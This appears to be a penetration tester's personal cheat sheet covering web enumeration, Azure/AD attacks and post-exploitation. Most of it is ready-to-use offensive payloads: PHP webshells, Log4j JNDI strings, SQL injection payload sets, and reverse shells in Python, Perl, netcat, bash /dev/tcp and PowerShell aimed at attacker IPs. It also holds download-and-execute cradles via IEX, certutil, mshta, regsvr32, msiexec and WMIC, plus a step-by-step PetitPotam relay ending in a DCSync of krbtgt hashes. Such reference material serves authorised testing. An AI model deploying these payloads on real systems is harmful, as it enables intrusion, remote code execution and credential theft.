Test-NetConnection -Port 587 -ComputerName email-smtp.us-west-2.amazonaws.com


# Web 

https://github.com/Elsfa7-110/Elsfa7110-Oneliner-bughunting

# Enumeration

## Screenshot enumeration
https://github.com/byt3bl33d3r/WitnessMe  
https://github.com/sensepost/gowitness  

 
## Wordlists

https://wordlists.assetnote.io  
https://github.com/danielmiessler/SecLists  
https://github.com/xajkep/wordlists  

## GraphQL

https://github.com/dolevf/graphw00f

## JWT

https://github.com/ticarpi/jwt_tool  
https://jwt.io/  
https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities  

  
# Email enumeration
## SimplyEmail
```
source ~/python2env/bin/activate
python SimplyEmail.py -e domain.com -all
```
## Linkedin2Username
Enumerate the names of each person working at a company and convert it to a specific notation
* You may need to login for verification
```
python3 linkedin2username.py -u <username> -p <password> -c linkedin-name
```
https://github.com/gremwell/o365enum

# Exploitation

## Webshells
PHP   
`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
Execute one command  
`<?php system("whoami"); ?>`

Take input from the url paramter. shell.php?cmd=whoami  
`<?php system($_GET['cmd']); ?>`

The same but using passthru  
`<?php passthru($_GET['cmd']); ?>`

For shell_exec to output the result you need to echo it  
`<?php echo shell_exec("whoami");?>`

Exec() does not output the result without echo, and only output the last line. So not very useful!  
`<?php echo exec("whoami");?>`

Instead to this if you can. It will return the output as an array, and then print it all.  
`<?php exec("ls -la",$array); print_r($array); ?>`

preg_replace(). This is a cool trick  
`<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>`

Using backticks  
`<?php $output =\'whoami\`; echo "\<pre>$output\</pre>"; ?>`

Using backticks  
`<?php echo ```whoami```; ?>`

https://github.com/d4rkiZ/ProcOpen-PHP-Webshell
https://github.com/kraken-ng/Kraken

# Burp suite

advanced regex:
^portal\.target\.com$

# Product specific

# Java BS

## Log4j
${jndi:ldap://domain.com:1234/a}  
 
Easy test for log4j dns lookups:
```
${jndi:dns://<domain>} 
${jndi:dns://<ip>}
nc -ulp 53
```

https://log4shell.tools/  
https://github.com/alexbakker/log4shell-tools  
## JBOSS

Common directories
```
/admin-console/
/invoker/JMXInvokerServlet
/jbossws/
/jmx-console/
/jmx-console/HtmlAdaptor
/management
/manager
/status?full=true
/web-console/
/web-console/Invoker
/web-console/ServerInfo.jsp
```

JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
https://github.com/joaomatosf/jexboss.git

# Java Server Faces

Example file:
```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core">
<head>
    <title>JSF Example</title>
</head>
<body>
    <h1>Welcome to JSF Example</h1>
    
    <h:form>
        <h:inputText value="#{userBean.name}" />
        <h:commandButton value="Submit" action="#{userBean.greet}" />
    </h:form>
    
    <h2>Output:</h2>
    <h:outputText value="#{userBean.greeting}" />
</body>
</html>
```

## Mendix
Look for authorisation issues.

Some queries need schema/id/guid, some can have an empty schema:
```
{"action":"retrieve_by_xpath","params":{"xpath":"//Personal.Foto","schema":{},"count":false}}
```

Schema/id en entity enumeration:
1. .XML frontend files enumeraten filter containing 'entity', grep for '"schema":"' to find guid
2. initial session response contains juicy data grep for 'klass' to find objects
3. Try to enumerate microflows:
//MxModelReflection.Microflows (geen guid nodig)

A few default schema's:
```
//System.User
//System.UserRole
//System.Session
//System.TimeZone
//System.Language
//System.Workflow
//System.WorkflowState
//System.WorkflowDefinition
//Administration.Account
```
Mendix uses the following action's to write and read data:
```
Action      Parameter
retrieve - queryId
retrieve_by_xpath - xpath 
retrieve_by_ids - ids
executeaction - actionname, applyto
poll_background_job
keepalive
commit - guids
export - gridid, buttonid, xpath
runtimeOperation - operationId
executemicroflow - name
```
Each action requires different parameters.

Whenever u use a retrieve_by_xpath query the response will contain a list of the found objects/guids:
```
"resultGuids":["17983245202395311","57913545202395512","27983845202395995","37983444202396999","55599999395718","57983849992335898","51983855202395949","545123845202226068"]
```
https://docs.mendix.com/    
https://github.com/mendix/RestServices


## Joomla

Joomscan

Interesting files:
```
/administrator/manifests/files/joomla.xml
/ templates/xxxx/templateDetails.xml
/vendor/composer/installed.json
```

## Citrix
https://github.com/Smarttech247PT/citrix_fgateway_fingerprint

Directories and files:
```
/cgi/Resources/List
/cgi/GetAuthMethods 
/nf/auth/getAuthenticationRequirements.do
/nf/auth/doEPA.do
/nf/auth/doLogoff.do
/nf/auth/getECdetails
/nf/auth/doAuthentication.do
```




# Azure / O365

Get information on tenant:
```https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1```  

Get the Tenant ID:
```https://login.microsoftonline.com/[Domain]/.well-known/openid-configuration```

When anonymous access on blob is enabled files can be accessed on domains like:
```
storage-account-name.blob.core.windows.net
storage-account-name.file.core.windows.net
storage-account-name.table.core.windows.net
storage-account-name.queue.core.windows.net
```
This can be detected by using Microburst: Invoke-EnumerateAzureBlobs -Base <domain>

Accessing an application through direct link with AppGUID:

If this app is owned by an organization (Azure AD tenant), use https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationMenuBlade/Authentication/appId/<AppGUID>.  
If this app is owned by your personal Microsoft (MSA) account, use https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationMenuBlade/Authentication/appId/<AppGUID>/isMSAApp/true.  


## Silver ticket
SSO is relying on Kerberos, and thus, has the same flaws. If the AZUREADSSOACC$ is compromised, one is able to create service tickets for impersonating any user with MFA disabled on Azure AD. This technique is also known as Silver Tickets.  
  
Silver tickets can be created using mimikatz. In order to do so, the following parameters are required:  
```
Username of the user to impersonate.
Domain name.
NTLM hash of the AZUREADSSOACC$ account.
SID of the user to impersonate.
Target service, which is HTTP/aadg.windows.net.nsatc.net.
```

## tools
CLI (Azure CLI, Azure PowerShell, AzureAD module)
https://github.com/dirkjanm/ROADtools  
https://github.com/Gerenios/AADInternals  
https://github.com/Azure/Stormspotter   
https://github.com/BloodHoundAD/AzureHound  
https://github.com/hausec/PowerZure  


https://github.com/dafthack/MFASweep - check azure/ms services for 2fa requirement  
https://zolder.io/detecting-mfasweep-using-azure-sentinel/  
https://github.com/dafthack/MSOLSpray  
https://github.com/NetSPI/MicroBurst  



https://medium.com/@Varma_Chekuri/introduction-to-azure-pentesting-2-de576dfb55b  



## ASP.NET MVC

@Html.Raw(Model.Name) = raw output
@Model.Name = encodede output
 
 
 <br /><br />
# SQL Injection

Sqlmap
```
Set custom injection point with * This can also be used in saved burp requests
```

```
login bypass
' OR 'a'='a
SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
enumerate databases, tables and columns via terminal
mysql -u root -p -e "SELECT schema_name FROM information_schema.schemas FROM information_schema.schemata
mysql -u root -p -e "SELECT table_name FROM information_schema.tables WHERE table_schema='mysql'"
mysql -u root -p -e "SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='user'
An attacker could also exploit the UNION command by supplying:
SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

SQL injection cheat sheet (sqli)
```
@@hostname : Current Hostname
@@tmpdir : Tept Directory
@@datadir : Data Directory
@@version : Version of DB
@@basedir : Base Directory
user() : Current User
database() : Current Database
version() : Version
schema() : current Database
UUID() : System UUID key
current_user() : Current User
current_user : Current User
system_user() : Current Sustem user
session_user() : Session user
@@GLOBAL.have_symlink : Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl : Check if it have ssl or not
Normal-injection
1 UNION ALL SELECT NULL,version()--
Retrieve database names:
1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
Retrieve table names:
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--
Retrieve column names:
1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'--
Retrieve data:
1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1--
Retrieve data from another database:
1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM database2.table1--
```

## Retrieve database version
```
1 AND extractvalue(rand(),concat(0x3a,version()))--
Retrieve database names:
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))--
Retrieve table names:
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1)))--
Retrieve column names:
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="table1" LIMIT 0,1)))--
Retrieve data:
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM table1 LIMIT 0,1)))--
Retrieve data from another database:
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM database2.table1 LIMIT 0,1)))--
1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
Retrieve database names:
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
Retrieve table names:
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--
Retrieve column names:
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)--
Retrieve data:
1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
Retrieve data from another database:
1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM database2.table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```

## Error-based
```
This query should result in the original page being displayed:
1 AND 1=1
Whilst this query should return a different page:
1 AND 1=2
Retrieve version:
1 AND (ascii(substr((SELECT version()),1,1))) > 52--
Note, a better way to retrieve the version in this context is to use the LIKE function:
1 AND (SELECT version()) LIKE "5%"--
Retrieve databases:
1 AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95--
Retrieve tables:
1 AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))) > 95--
Retrieve columns:
1 AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1))) > 95--
Retrieve data:
1 AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95--
Retrieve data from another database:
1 AND (ascii(substr((SELECT column1 FROM database2.table1 LIMIT 0,1),1,1))) > 95--
```
## Time-Based  
```
1 AND sleep(10)--
Retrieve version:
1 AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)--
Retrieve version using LIKE:
1 AND IF((SELECT version()) LIKE "5%",sleep(10),NULL)--
Retrieve databases:
1 AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
Retrieve tables:
1 AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--
Retrieve columns:
1 AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
Retrieve data:
1 AND IF(((ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
Retrieve data from another database:
1 AND IF(((ascii(substr((SELECT column1 FROM database1.table1 LIMIT 0,1),1,1)))) >95,sleep(10),NULL)--
```

# Passwords


## Password Cracking

Cracking IPMI 
```
./hashcat -m 7300 ~/Desktop/hashes ~/Desktop/Lists/passwords.txt --username
```
Wordlists: \
https://github.com/ohmybahgosh/RockYou2021.txt \
https://raw.githubusercontent.com/OpenTaal/opentaal-wordlist/master/wordlist.txt \
https://github.com/OpenTaal/opentaal-wordlist
https://weakpass.com/wordlist

Resources and tools: \
https://github.com/JakeWnuk/HIBPv7-Resources \
https://github.com/glitchedgitz/cook 

Rules:\
https://github.com/rarecoil/pantagrule \
https://github.com/Unic0rn28/hashcat-rules/blob/main/unicorn%20rules/SuperUnicorn.rule \
https://github.com/NotSoSecure/password_cracking_rules  \
https://github.com/n0kovo/hashcat-rules-collection \
https://github.com/golem445/Corporate_Masks

## Password Spraying / Login 

https://github.com/knavesec/CredMaster \
https://github.com/blacklanternsecurity/TREVORspray \
https://github.com/byt3bl33d3r/SprayingToolkit \
https://github.com/dafthack/DomainPasswordSpray  \
https://github.com/dafthack/MailSniper 
<br /><br />
 
# Phishing 
https://github.com/tokyoneon/CredPhish





<br /><br />



# Post Exploitation
# Linux
Getting a shell / Reverse shells
```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```
## Netcat
Reverse shell
```
nc 172.16.1.100 443 -e /bin/sh
nc.exe -e cmd.exe 172.16.1.100 443
```
Sending file
```
nc -l -p 443 > out.file
nc -w 3 10.0.0.1 443 < in.file
```
Listen for DNS requests:
```
nc -ulp 53
```


## Reverse shell without Netcat
Basic linux
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
mknod backpipe p; nc 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
/bin/bash -i > /dev/tcp/10.0.0.1/443 0<&1 2>&1
mknod backpipe p; telnet 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
telnet 10.0.0.1 <1st_port> | /bin/bash | telnet 10.0.0.1 <2nd_port>
wget -O /tmp/bd.php http://10.0.0.1/evil.php && php -f /tmp/bd.php
 ```
LUA
```
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
Ruby
```
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
Perl
```
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
Python
```
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
```
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```
Powershell
```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Linux Privilege Escalation

pstree -p

## Enumeration scripts
https://github.com/carlospolop/PEASS-ng

<br /><br />





# Windows Server 

## Azure AD Connect
-The MSOL account is used to synchronise on-prem with azure  


## Bloodhound
https://github.com/CompassSecurity/BloodHoundQueries

## CVE's

## Petite Potam
PetitPotam
```
1. Gebruik crackmapexec (of een andere tool/script) om de Active Directory Certificate Services systemen op te vragen.
(Nieuwste versie van cme is benodigd om ldap module te kunnen gebruiken, bijvoorbeeld 5.2.3)
cme ldap 'domaincontroller' -d 'domain' -u 'user' -p 'password' -M adcs 

2. Zet de relay aanval op richting de Certificate Authority server:
impacket-ntlmrelayx -debug -smb2support --adcs -t https://<CA SERVER>/certsrv/certfnsh.asp --template DomainController

Trigger de NTLM authenticatie zodat de reflectie verstuurd kan worden middels PetitPotam.py (topotam):
3. python3 PetitPotam.py <responder IP> <domain> -u 'username' -p 'password'
  
Als de aanval succesvol verloopt beschik je nu over het CA certificaat in base64 vorm.

4. Start 'kekeo.exe' (gentlwiki), schakel Base64 input in en vraag een TGT (Ticket Granting Ticket) aan middels het eerder bemachtigde certificaat (PBX)
a. kekeo # base64 /input:on
b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<domain> /ptt

5. Start mimikatz (gentlwiki) om een dcsync uit te voeren en de NTLM hash van iedere gewenste user te dumpen:
1. lsadump::dcsync /domain:<domain> /user:krbtgt
2. lsadump::dcsync /domain:<domain> /user:dcadmin
```

## Crackmapexec

## Responder

## RDP Attacks

https://github.com/0x09AL/RdpThief
Mitm RDP tool
https://github.com/GoSecure/pyrdp

# Windows Local
## Directory and file notations
Directory/file name bypasses
```
C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
C:\>powershell C:\*\*2\n??e*d.* notepad.exe
C:\>powershell C:\*\*2\t?s*r.* taskmgr.exe
```
8.3 / Short filename notation
```
dir /a:h /x
for %A in (*.*) do @echo %~nsA %~nA

C:\>dir /a:h /x
                                        *
13/10/2011  09:14 AM    <DIR>          DOCUME~1     Documents and Settings
13/10/2011  09:05 AM    <DIR>          PROGRA~1     Program Files
13/10/2011  09:05 AM    <DIR>          PROGRA~2     Program Files(x86)

C:\>for %A in (*.*) do @echo %~nsA %~nA
$WINDOWS $WINDOWS
DOCUME~1 Documents and Settings
NVIDIA~1 NVIDIA Corporation
SYSTEM~1 System Volume Information
```
# Execution of backdoors
## MSHTA
```
mshta.exe vbscript:Close(Execute("GetObject(""script:http://127.0.0.1:4444/payload.sct"")"))
mshta http://127.0.0.1:4444/payload.hta
mshta http://webserver/payload.hta
mshta.exe \\127.0.0.1\folder\payload.hta
mshta \\webdavserver\folder\payload.hta
```
MSTA to PS
```
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
HTA
```
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
        var c = "cmd.exe /c calc.exe"; 
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
SCT Payloads
```
<?XML version="1.0"?>
<scriptlet>
  <public>
  </public>
  <script language="JScript">
    <![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
  </script>
</scriptlet>
```
```
<html>
  <head>
    <HTA:APPLICATION ID="HelloExample">
    <script language="jscript">
      new ActiveXObject('WScript.Shell').Run("cmd.exe /c calc.exe");
    </script>
  </head>
  <body>
    <script>self.close();</script>
  </body>
</html>
```
MSHTA - SCT
```
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
MSHTA - Metasploit
```
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```
```
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
## Rundll32
```
rundll32 \\webdavserver\folder\payload.dll,entrypoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Rundll32 - SCT
```
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
## Regsvr32
```
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Regsvr32 - SCT
```
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration 
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
        ]]>
</script>
</registration>
</scriptlet>
```
Regsvr32 - Metasploit
```
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```

## Certutil

```
certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
```
```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
## CScript/Wscript
```
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
Cscript - Metasploit
```
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
## MSIExec
Attacker
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Victim
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```

## WMIC
```
wmic os get /format:"https://webserver/payload.xsl"
```
Example XSL file
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```
## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Create own shell executer in .NET and build to bypass Application whitelisting
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
## Powershell
```
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

# Windows Privilege Escalation

Get hash of current user
```
powershell -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('https://github.com/elnerd/Get-NetNTLM/raw/master/Get-NetNTLM.ps1'); Get-NetNTLM-Hash"
```

## Enumeration scripts
https://github.com/carlospolop/PEASS-ng


## AMSI / AV Bypass
https://github.com/RythmStick/AMSITrigger
https://amsi.fail/
https://github.com/danielbohannon/Invoke-Obfuscation
https://github.com/JoelGMSec/Invoke-Stealth

https://github.com/S3cur3Th1sSh1t/PowerSharpPack


# Linux binary exploitation
dump ELF’s header
$readelf -h <filename>

Symbols  
```
non stripped binary
$ readelf --syms <filename>.out

stripping symbols from a binary
$ strip --strip-all <filename>.out
$ readelf --syms <filename>.out
```

Sections  
```
dump all ELF’s sections information
$readelf --sections --wide <filename>.out
dump the .plt section
$ objdump -M intel --section .plt -d <filename>.out
dump the relocs
$ readelf --relocs <filename>.out
``` 

Program headers  
```
dump all ELF’s program headers information
$ readelf --segments --wide <filename>.out
```

Binary Inspection/Forensic  

```
Check magic bytes to obtain file type
$ file <filename>
base64 decode
$ base64 -d <encoded_file> > <decoded_file>
uncompress preview
$ file -z <compressed_file>
uncompress file
$ tar xvzf <compressed_file>
find library dependencies
$ ldd <filename>
dump hex first 128 bytes
$ xxd -l 128 <filename>
dump binary first 128 bytesr
$ xxd -b -l 128 <filename>
dump c-style header first 128 bytes at a 256-bytes offset
$ xxd -i -s 256 -l 128 <filename>
extract 64-bytes long ELF header residing 52 bytes after start, 1 byte a time time
$ dd skip=52 count=64 if=<input_filename> of=<output_filename> bs=1
Calculate total binary file given ELF header only
total_size = elf_section_header_offset + (elf_section_headers_count * elf_section_header_size)
List symbols from object file
$ nm <filename>
List and demangle dynamic symbols from stripped object file
$ nm -D --demangle <filename>
Add current path to the linker environment
$ export LD_LIBRARY_PATH=`pwd`
Trace system calls
$ strace <filename>`
Trace library calls while demangling C++ functions and printing EIP
$ ltrace -i -C <filename>`
```

Disassembling  
